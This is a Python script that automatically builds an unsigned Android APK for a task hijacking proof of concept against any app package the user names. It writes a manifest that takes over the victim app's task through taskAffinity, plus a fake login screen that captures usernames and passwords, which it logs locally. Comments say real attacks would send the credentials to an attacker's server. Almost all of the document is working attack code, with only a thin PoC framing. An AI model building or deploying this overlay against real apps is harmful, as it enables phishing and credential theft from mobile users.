import os
import subprocess
import sys
import shutil

def task_hijacking_apk_builder():
    """
    Fully automated APK generation for Task Hijacking PoC.
    Prompts for target app details and builds an unsigned APK.
    """
    # Prompt the user for package name and activity name
    print("==== Task Hijacking APK Builder ====")
    target_package = input("Enter the target application package name: ")
    target_activity = input("Enter the target activity name to hijack: ")
    
    # Validate inputs
    if not target_package or not target_activity:
        print("Error: Package name and activity name cannot be empty.")
        sys.exit(1)
    
    print(f"\nBuilding task hijacking APK targeting:")
    print(f"- Package: {target_package}")
    print(f"- Activity: {target_activity}")
    print("-" * 40)
    
    # Helper function
    def ensure_directory_exists(path):
        """Create directory if it doesn't exist"""
        if not os.path.exists(path):
            os.makedirs(path)

    # Setup paths
    base_dir = os.path.dirname(os.path.abspath(__file__))
    project_dir = os.path.join(base_dir, "Task-Hijacking-PoC")
    
    # Find Android SDK
    sdk_path = os.path.join(os.environ['LOCALAPPDATA'], 'Android', 'Sdk')
    if not os.path.exists(sdk_path):
        print("Error: Android SDK not found.")
        print("Please install Android Studio and the Android SDK.")
        sys.exit(1)

    # Find build tools
    build_tools_path = os.path.join(sdk_path, 'build-tools')
    if not os.path.exists(build_tools_path):
        print("Error: Android build tools not found.")
        print("Please install build tools using Android Studio SDK Manager.")
        sys.exit(1)

    # Get latest build tools version
    versions = [d for d in os.listdir(build_tools_path) if os.path.isdir(os.path.join(build_tools_path, d))]
    if not versions:
        print("Error: No build tools versions found.")
        print("Please install build tools using Android Studio SDK Manager.")
        sys.exit(1)

    latest_version = sorted(versions)[-1]
    tools_path = os.path.join(build_tools_path, latest_version)

    # Setup project structure
    print("Setting up project...")
    if os.path.exists(project_dir):
        shutil.rmtree(project_dir)
    
    # Create project directories
    src_dir = os.path.join(project_dir, "src")
    java_dir = os.path.join(src_dir, "com", "taskhijacking", "poc")
    res_dir = os.path.join(project_dir, "res")
    
    ensure_directory_exists(java_dir)
    ensure_directory_exists(os.path.join(res_dir, "layout"))
    ensure_directory_exists(os.path.join(res_dir, "values"))
    ensure_directory_exists(os.path.join(res_dir, "drawable"))
    
    # Write Android Manifest with taskAffinity targeting the victim app
    # This is key for the task hijacking attack
    manifest = f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.taskhijacking.poc">
    
    <application
        android:allowBackup="true"
        android:label="Task Hijacking PoC"
        android:theme="@android:style/Theme.Material.Light">
        
        <!-- Main entry point (launcher) -->
        <activity android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <!-- Hijacking Activity that targets the specified app -->
        <activity android:name=".HijackingActivity"
            android:exported="true"
            android:taskAffinity="{target_package}"
            android:launchMode="singleTask"
            android:excludeFromRecents="true"
            android:theme="@android:style/Theme.Material.Light.NoActionBar">
            
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="http" />
                <data android:host="target-app" />
            </intent-filter>
            
            <!-- Additional intent filter to match target app's activity -->
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <data android:scheme="package" android:host="{target_package}" />
            </intent-filter>
        </activity>
    </application>
</manifest>'''

    with open(os.path.join(project_dir, "AndroidManifest.xml"), 'w') as f:
        f.write(manifest)

    # Write layout file for MainActivity
    main_layout = '''<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:padding="16dp">

    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Task Hijacking PoC"
        android:textSize="24sp"
        android:textStyle="bold"
        android:layout_marginBottom="16dp" />

    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="This app demonstrates task hijacking vulnerability. Click the button below to launch the attack."
        android:textSize="16sp"
        android:layout_marginBottom="24dp" />

    <Button
        android:id="@+id/btnLaunchAttack"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Launch Attack"
        android:layout_gravity="center" />

</LinearLayout>'''

    with open(os.path.join(res_dir, "layout", "activity_main.xml"), 'w') as f:
        f.write(main_layout)

    # Write layout file for Hijacking activity (fake login screen)
    hijack_layout = f'''<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:padding="16dp"
    android:gravity="center">

    <TextView
        android:id="@+id/tvTitle"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="{target_package}"
        android:textSize="24sp"
        android:textStyle="bold"
        android:gravity="center"
        android:layout_marginBottom="32dp" />

    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Please login to continue"
        android:textSize="18sp"
        android:gravity="center"
        android:layout_marginBottom="24dp" />

    <EditText
        android:id="@+id/etUsername"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:hint="Username"
        android:layout_marginBottom="8dp"
        android:inputType="text" />

    <EditText
        android:id="@+id/etPassword"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:hint="Password"
        android:layout_marginBottom="16dp"
        android:inputType="textPassword" />

    <Button
        android:id="@+id/btnLogin"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Login" />

    <TextView
        android:id="@+id/tvStatus"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="TASK HIJACKING POC - CREDENTIALS WILL BE CAPTURED"
        android:textColor="#FF0000"
        android:gravity="center"
        android:layout_marginTop="32dp"
        android:textStyle="bold"/>

</LinearLayout>'''

    with open(os.path.join(res_dir, "layout", "activity_hijacking.xml"), 'w') as f:
        f.write(hijack_layout)

    # Write strings.xml
    strings = '''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">Task Hijacking PoC</string>
</resources>'''

    with open(os.path.join(res_dir, "values", "strings.xml"), 'w') as f:
        f.write(strings)

    # Write MainActivity.java
    main_activity = f'''
package com.taskhijacking.poc;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

public class MainActivity extends Activity {{
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        Button btnLaunchAttack = findViewById(R.id.btnLaunchAttack);
        btnLaunchAttack.setOnClickListener(new View.OnClickListener() {{
            @Override
            public void onClick(View v) {{
                launchAttack();
            }}
        }});
    }}
    
    private void launchAttack() {{
        try {{
            // Start our hijacking activity
            Intent intent = new Intent(this, HijackingActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            
            // Show instruction to user
            Toast.makeText(this, "Attack launched! Return to recent apps and you'll see the malicious activity", 
                           Toast.LENGTH_LONG).show();
            
            // Try to launch the target app to see the attack in action
            Intent launchTarget = getPackageManager().getLaunchIntentForPackage("{target_package}");
            if (launchTarget != null) {{
                startActivity(launchTarget);
            }}
        }} catch (Exception e) {{
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }}
    }}
}}'''

    with open(os.path.join(java_dir, "MainActivity.java"), 'w') as f:
        f.write(main_activity)

    # Write HijackingActivity.java
    hijacking_activity = f'''
package com.taskhijacking.poc;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

public class HijackingActivity extends Activity {{
    private static final String TAG = "TaskHijacking";
    private EditText etUsername;
    private EditText etPassword;
    private TextView tvStatus;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_hijacking);
        
        etUsername = findViewById(R.id.etUsername);
        etPassword = findViewById(R.id.etPassword);
        tvStatus = findViewById(R.id.tvStatus);
        
        Button btnLogin = findViewById(R.id.btnLogin);
        btnLogin.setOnClickListener(new View.OnClickListener() {{
            @Override
            public void onClick(View v) {{
                captureCredentials();
            }}
        }});
        
        // Set the target package name as the title
        TextView tvTitle = findViewById(R.id.tvTitle);
        tvTitle.setText("{target_package}");
        
        // Log the task hijacking attempt
        Log.i(TAG, "Task hijacking attempt against package: {target_package}");
        Log.i(TAG, "Target activity: {target_activity}");
    }}
    
    private void captureCredentials() {{
        String username = etUsername.getText().toString();
        String password = etPassword.getText().toString();
        
        if (username.isEmpty() || password.isEmpty()) {{
            Toast.makeText(this, "Please enter both username and password", Toast.LENGTH_SHORT).show();
            return;
        }}
        
        // In a real attack, credentials would be sent to an attacker's server
        // For this PoC, we just log them locally
        Log.i(TAG, "Captured credentials - Username: " + username);
        Log.i(TAG, "Captured credentials - Password: " + password);
        
        tvStatus.setText("Credentials captured! Username: " + username);
        
        // Notify user this is a PoC
        Toast.makeText(this, "Task hijacking successful! Credentials captured.", Toast.LENGTH_LONG).show();
        
        // In a real attack, the malicious app might now redirect to the legitimate app
        // to avoid suspicion
    }}
    
    @Override
    protected void onNewIntent(Intent intent) {{
        super.onNewIntent(intent);
        Log.i(TAG, "onNewIntent: " + intent.toString());
        // Received a new intent, which could be from returning to this task
    }}
}}'''

    with open(os.path.join(java_dir, "HijackingActivity.java"), 'w') as f:
        f.write(hijacking_activity)

    # Find Android Studio's JDK
    android_studio_path = os.path.join(os.environ['PROGRAMFILES'], 'Android', 'Android Studio')
    if not os.path.exists(android_studio_path):
        print("Error: Android Studio not found.")
        print("Please install Android Studio in the default location.")
        sys.exit(1)

    jbr_path = os.path.join(android_studio_path, "jbr")
    if not os.path.exists(jbr_path):
        print("Error: Android Studio JDK not found.")
        print("Please ensure Android Studio is properly installed.")
        sys.exit(1)

    os.environ['JAVA_HOME'] = jbr_path

    # Build APK using Android build tools
    print("Building APK...")
    
    # 1. Compile resources
    print("Compiling resources...")
    aapt = os.path.join(tools_path, "aapt.exe")
    if not os.path.exists(aapt):
        print("Error: aapt not found.")
        print("Please install build tools using Android Studio SDK Manager.")
        sys.exit(1)

    subprocess.run([aapt, "package", "-f", "-m",
                   "-J", src_dir,
                   "-M", os.path.join(project_dir, "AndroidManifest.xml"),
                   "-S", res_dir,
                   "-I", os.path.join(sdk_path, "platforms", "android-33", "android.jar")],
                  check=True)

    # 2. Compile Java files
    print("Compiling Java files...")
    javac = os.path.join(jbr_path, "bin", "javac.exe")
    android_jar = os.path.join(sdk_path, "platforms", "android-33", "android.jar")
    
    # Create classes directory
    classes_dir = os.path.join(project_dir, "classes")
    ensure_directory_exists(classes_dir)

    subprocess.run([javac,
                   "-source", "1.8",
                   "-target", "1.8",
                   "-bootclasspath", android_jar,
                   "-d", classes_dir,
                   os.path.join(java_dir, "MainActivity.java"),
                   os.path.join(java_dir, "HijackingActivity.java"),
                   os.path.join(src_dir, "com", "taskhijacking", "poc", "R.java")],
                  check=True)

    # 3. Create JAR file
    print("Creating JAR file...")
    jar = os.path.join(jbr_path, "bin", "jar.exe")
    classes_jar = os.path.join(project_dir, "classes.jar")
    
    # Change to classes directory to create jar with correct structure
    current_dir = os.getcwd()
    os.chdir(classes_dir)
    subprocess.run([jar, "cf", classes_jar, "com"],
                  check=True)
    os.chdir(current_dir)

    # 4. Convert JAR to DEX
    print("Converting to DEX format...")
    d8 = os.path.join(tools_path, "d8.bat")
    if not os.path.exists(d8):
        print("Error: d8 not found.")
        print("Please install build tools using Android Studio SDK Manager.")
        sys.exit(1)

    # Create output directory
    dex_output_dir = os.path.join(project_dir, "dex-output")
    ensure_directory_exists(dex_output_dir)
    
    subprocess.run([d8,
                   "--lib", android_jar,
                   "--output", dex_output_dir,
                   classes_jar],
                  check=True)

    # 5. Build APK using Android Build Tools
    print("Building APK...")
    output_apk = os.path.join(base_dir, "task_hijacking.apk")
    
    # Create a minimal APK with just the necessary components
    subprocess.run([aapt, "package", "-f", "-M", 
                   os.path.join(project_dir, "AndroidManifest.xml"),
                   "-S", res_dir,
                   "-I", android_jar,
                   "--min-sdk-version", "24",
                   "--target-sdk-version", "28",
                   "-F", output_apk],
                  check=True)
    
    # Copy DEX file to current directory for easier adding
    shutil.copy2(os.path.join(dex_output_dir, "classes.dex"), "classes.dex")
    
    # Add the DEX file to APK
    subprocess.run([aapt, "add", output_apk, "classes.dex"],
                  check=True)
    
    # Clean up
    if os.path.exists("classes.dex"):
        os.remove("classes.dex")

    # APK is unsigned at this point
    print("APK generation complete (unsigned).")
    print(f"\nBuild successful! APK generated at: {output_apk}")
    
    return output_apk

if __name__ == "__main__":
    task_hijacking_apk_builder()
